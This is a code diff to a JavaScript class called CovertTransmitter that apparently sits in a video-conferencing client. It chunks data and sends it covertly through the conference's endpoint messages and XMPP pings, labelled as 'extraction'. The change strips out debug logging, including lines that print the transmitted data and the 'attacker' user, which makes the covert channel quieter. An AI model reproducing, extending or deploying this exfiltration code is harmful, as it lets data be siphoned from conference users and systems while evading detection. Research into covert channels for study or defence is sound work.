@@ -39,9 +39,7 @@ export default class CovertTransmitter extends CovertCommunicationInitiator {
      * @param {any} data - specified data to be sent
      */
     async useEndpoint() {
-        console.log('self check:', this);
         for (const chunkData of splitString(this.data, this.configuration.chunkSize)) {
-            console.log('data:', chunkData);
             APP.conference.sendEndpointMessage(this.user.getId(), {
                 extraction: 'reply',
                 payload: chunkData
@@ -99,9 +97,6 @@ export default class CovertTransmitter extends CovertCommunicationInitiator {
      */
     async useXMPP() {
         const splitedData = splitString(this.data, this.configuration.chunkSize);
-
-        console.log('Data:', splitedData);
-
         const intervalRef = setInterval(() => {
             if (!splitedData.length) {
                 clearInterval(intervalRef);
@@ -109,7 +104,6 @@ export default class CovertTransmitter extends CovertCommunicationInitiator {
 
                 return;
             }
-            console.log('attacker:', this.user);
             this.extractionPing(message => {
                 console.log('success', message, splitedData);
             }, message => {
